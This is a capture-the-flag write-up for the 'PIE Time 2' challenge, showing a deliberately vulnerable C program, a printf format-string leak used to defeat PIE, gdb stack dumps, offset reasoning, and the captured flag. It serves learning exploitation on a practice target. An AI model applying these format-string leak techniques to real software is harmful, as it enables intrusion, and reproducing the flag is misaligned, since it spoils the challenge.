---
tags:
    - ctf
    - binex
date: 2024-10-17
---

# PIE Time 2

CTF write up for cylabacademy's [PIE Time 2](https://learn.cylabacademy.org/library/491?page=1&category=6&difficulty=2)

## Security Mitigations

```console
$ pwn checksec vuln
[*] '/home/tristan/Downloads/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## Identify the Vulnerability

This challenge comes with source code:

```c title="vuln.c" hl_lines="18-19 14-15"
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

Things to note:

- There's a `printf` memory leak. We can use this to leak the return address to the `main`.
- This challenge doesn't make us find a way to redirect execution; it simply request and address with `scanf` and jumps to it.

## Exploit

When `printf` only has a single argument, and that format string has format specifiers, the resulting behavior is undefined. Apparently, most mainstream libc implelentations will function as though the arguments were passed in via the typical locations.[^1]

For example, if we enter the format string `%p %p %p %p %p %p` as input:

```console
$ ./vuln
Enter your name:%p %p %p %p %p %p
0x5555555592a1 0xfbad2288 0x7ffff7d1bb91 0x5555555592b2 0x410 0x7fffffffd9c0
```

And using gdb/gef, we can see those values are in the typical argument registers, then the stack once the 6 argument registers are exhausted:

```text title="gef context with registers and stack, just before printf is called with user-controlled format string" hl_lines="8 4 5 11 12 23"
──── registers ────
$rax   : 0x0
$rbx   : 0x00007fffffffdb38  →  0x00007fffffffdf0c  →  "/home/tristan/Downloads/vuln"
$rcx   : 0x00007ffff7d1bb91  →  0x4f77fffff0003d48 ("H="?)
$rdx   : 0xfbad2288
$rsp   : 0x00007fffffffd998  →  0x000055555555531c  →  <call_functions+0055> lea rdi, [rip+0xd1d]        # 0x555555556040
$rbp   : 0x00007fffffffda00  →  0x00007fffffffda10  →  0x00007fffffffdab0  →  0x00007fffffffdb10  →  0x0000000000000000
$rsi   : 0x00005555555592a1  →  "p %p %p %p %p %p\n"
$rdi   : 0x00007fffffffd9b0  →  "%p %p %p %p %p %p\n"
$rip   : 0x00007ffff7c60100  →  <printf+0000> endbr64
$r8    : 0x00005555555592b2  →  0x0000000000000000
$r9    : 0x410
$r10   : 0x1
$r11   : 0x246
$r12   : 0x1
$r13   : 0x0
$r14   : 0x0
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →  0x00010102464c457f
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
──── stack ────
0x00007fffffffd998│+0x0000: 0x000055555555531c  →  <call_functions+0055> lea rdi, [rip+0xd1d]        # 0x555555556040    ← $rsp
0x00007fffffffd9a0│+0x0008: 0x00007fffffffd9c0  →  0x00007fffff000a70 ("p\n"?)
0x00007fffffffd9a8│+0x0010: 0x00007ffff7c924f5  →  <_IO_file_setbuf+0015> test rax, rax
0x00007fffffffd9b0│+0x0018: "%p %p %p %p %p %p\n"        ← $rdi
0x00007fffffffd9b8│+0x0020: " %p %p %p\n"
0x00007fffffffd9c0│+0x0028: 0x00007fffff000a70 ("p\n"?)
0x00007fffffffd9c8│+0x0030: 0x00007ffff7c8875f  →  <setvbuf+012f> cmp rax, 0x1
0x00007fffffffd9d0│+0x0038: 0x0000000000000000

```

Looking at the stack, we can see that the return address to `main` is 13 8-byte slots after the `0x7fffffffd9c0` value that was printed earlier:

```python hl_lines="2 9 13"
gef➤  x/15gx $rsp
0x7fffffffd998: 0x000055555555532d      0x00007fffffffd9c0 #(1)!
0x7fffffffd9a8: 0x00007ffff7c924f5      0x7025207025207025
0x7fffffffd9b8: 0x2520702520702520      0x00007fffff000a70
0x7fffffffd9c8: 0x00007ffff7c8875f      0x0000000000000000
0x7fffffffd9d8: 0x00007fffffffdb38      0x0000000000000001
0x7fffffffd9e8: 0x0000000000000000      0x0000000000000000
0x7fffffffd9f8: 0xc84e8d8f5c25b800      0x00007fffffffda10
0x7fffffffda08: 0x0000555555555441 #(2)!
gef➤  bt
#0  __printf (format=0x555555556040 " enter the address to jump to, ex => 0x12345: ") at ./stdio-common/printf.c:28
#1  0x000055555555532d in call_functions ()
#2  0x0000555555555441 in main ()
```

1.  This value was the last value printed by `printf` when we passed in 6 `%p` format specifiers.
2.  This is the return address to `main`, as see in the `bt` backtrace.

## Solution

We can calculate we need 19 `%p` format specifiers to reach the return address to `main` (13 slots after the last printed value, plus 6 slots for the 6 `%p` format specifiers we already passed in).

```py
--8<-- "./docs/assets/code/picoctf/pie_time_2/solution.py"
```

Run it:

```console
$ uv run docs/assets/code/picoctf/pie_time_2/solution.py
[+] Opening connection to rescued-float.picoctf.net on port 50864: Done
[*] Switching to interactive mode
You won!
picoCTF{p13_5h0u1dn'7_134k_9650b792}
```


*[CTF]: Capture the Flag. CTFs are challenges for computer hackers.
*[NX]: Non eXecutable stack
*[PIE]: Position Independent Executable.


[^1]: [Format String Vulnerabilities for CTF Binary Exploitation | How printf works](https://picoctfsolutions.com/posts/format-string-ctf#printf-basics)
